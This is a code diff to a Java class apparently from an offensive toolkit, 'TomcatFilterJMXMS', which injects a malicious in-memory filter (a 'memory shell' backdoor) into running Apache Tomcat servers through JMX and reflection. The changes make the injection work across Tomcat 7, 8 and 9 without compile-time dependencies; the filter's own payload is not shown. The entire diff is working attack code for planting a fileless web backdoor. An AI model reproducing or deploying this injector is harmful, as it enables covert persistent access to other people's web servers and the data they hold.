@@ -42,8 +42,8 @@ public class TomcatFilterJMXMS implements Filter {
             }
             for (NamedObject namedObject : objectSet) {
                 javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
-                org.apache.catalina.authenticator.AuthenticatorBase authenticatorBase = (org.apache.catalina.authenticator.AuthenticatorBase) getFieldValue(dynamicMBean, "resource");
-                org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(authenticatorBase, "context");
+                Object authenticatorBase = getFieldValue(dynamicMBean, "resource");
+                Object standardContext = getFieldValue(authenticatorBase, "context");
 
                 Object filterDef = standardContext.getClass().getDeclaredMethod("findFilterDef", String.class).invoke(standardContext, NAME);
 
@@ -52,17 +52,29 @@ public class TomcatFilterJMXMS implements Filter {
                 }
                 TomcatFilterJMXMS filterMemShell = new TomcatFilterJMXMS();
 
+                // tomcat 7
+                // org.apache.catalina.deploy.FilterDef
+                // tomcat 8 9
+                // org.apache.tomcat.util.descriptor.web.FilterDef
                 try {
-                    // tomcat 7
-                    // org.apache.catalina.deploy.FilterDef
                     // 添加 filterDef
-                    filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
+                    try {
+                        filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
+                    } catch (ClassNotFoundException e) {
+                        filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
+                    }
                     filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, NAME);
                     filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, filterMemShell.getClass().getName());
+                    filterDef.getClass().getDeclaredMethod("setFilter", Class.forName("javax.servlet.Filter")).invoke(filterDef, filterMemShell);
                     standardContext.getClass().getDeclaredMethod("addFilterDef", filterDef.getClass()).invoke(standardContext, filterDef);
 
                     // 添加 filterMap
-                    Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
+                    Object filterMap = null;
+                    try {
+                        filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
+                    } catch (ClassNotFoundException e) {
+                        filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
+                    }
                     filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, NAME);
                     filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, pattern);
                     filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");
@@ -70,37 +82,14 @@ public class TomcatFilterJMXMS implements Filter {
 
                     // 添加 filterConfig
                     java.util.Map filterConfigs = (java.util.Map) getFieldValue(standardContext, "filterConfigs");
-                    java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, filterDef.getClass());
+                    java.lang.reflect.Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), filterDef.getClass());
                     constructor.setAccessible(true);
-                    org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+//                    org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+                    Object filterConfig = constructor.newInstance(standardContext, filterDef);
                     filterConfigs.put(NAME, filterConfig);
-                } catch (ClassNotFoundException e) {
-                    // tomcat 8 9
-                    // org.apache.tomcat.util.descriptor.web.FilterDef
-                    // 添加 filterDef
-                    filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
-                    filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, NAME);
-                    filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, filterMemShell.getClass().getName());
-                    filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, filterMemShell);
-                    standardContext.getClass().getDeclaredMethod("addFilterDef", filterDef.getClass()).invoke(standardContext, filterDef);
-
-                    // 添加 filterMap
-                    Object filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
-                    filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, NAME);
-                    filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, pattern);
-                    filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");
-                    standardContext.getClass().getDeclaredMethod("addFilterMap", filterMap.getClass()).invoke(standardContext, filterMap);
-
-                    // 添加 filterConfig
-                    java.util.Map filterConfigs = (java.util.Map) getFieldValue(standardContext, "filterConfigs");
-                    java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, filterDef.getClass());
-                    constructor.setAccessible(true);
-                    org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
-                    filterConfigs.put(NAME, filterConfig);
+                } catch (Exception e) {
                 }
-
             }
-
 
         } catch (Exception e) {
 
